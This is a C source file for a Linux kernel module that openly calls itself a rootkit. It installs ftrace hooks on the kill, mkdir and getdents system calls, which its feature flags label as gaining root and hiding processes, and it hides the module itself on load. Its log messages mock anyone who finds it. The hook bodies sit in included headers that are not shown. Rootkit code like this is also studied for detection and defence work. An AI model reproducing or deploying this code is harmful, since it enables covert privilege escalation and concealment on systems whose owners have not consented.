/*
 * credits goes to xcellerator, which provided the base code for this rootkit
 */

#define HIDE_MODULE 1

#define SYSCALL_HOOK 1 
#define HOOK_FEAT_SET_ROOT 1
#define HOOK_FEAT_MKDIR_TEST 1
#define HOOK_FEAT_HIDE_PROC 1

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Began Bajrami");
MODULE_DESCRIPTION("IRM-C");
MODULE_VERSION("0.01");

#ifdef SYSCALL_HOOK
#define PTREGS_SYSCALL_STUBS 1

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#include "ftrace_helper.h"

#ifdef HOOK_FEAT_MKDIR_TEST
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
#endif

#ifdef HOOK_FEAT_SET_ROOT
static asmlinkage long (*orig_kill)(const struct pt_regs *);
#endif

#ifdef HOOK_FEAT_HIDE_PROC
char hide_pid[NAME_MAX];
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
#endif

#include "features/syscallhook.h" // HOOK FUNCTIONS

/* Declare the struct that ftrace needs to hook the syscall */

static struct ftrace_hook hooks[] = {
  #ifdef HOOK_FEAT_MKDIR_TEST
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
  #endif

  #ifdef HOOK_FEAT_SET_ROOT
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
  #endif
  
  #ifdef HOOK_FEAT_HIDE_PROC
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
  #endif
};

#endif



#ifdef HIDE_MODULE
#include "features/hide.h"
#endif

static int __init rootkit_init(void) {
  printk(KERN_INFO "hey! i'm just a chill module.\n");

#ifdef HIDE_MODULE
  printk(KERN_INFO "let me hide myself...\n");
  hideme();
#endif

#ifdef SYSCALL_HOOK
  int err;
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks)); // Install the hooks in hooks
  if(err)
      return err;

  printk(KERN_INFO "hooks loaded...\n");
#endif

  return 0;
}

static void __exit rootkit_exit(void) {
  /* Note that you won't be able to unload this LKM yet... */
  printk(KERN_INFO "How did you find me?\n");

#ifdef SYSCALL_HOOK
  /* Unhook and restore the syscall and print to the kernel buffer */
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "i removed the hook... you happy now?\n");
#endif

}

module_init(rootkit_init);
module_exit(rootkit_exit);
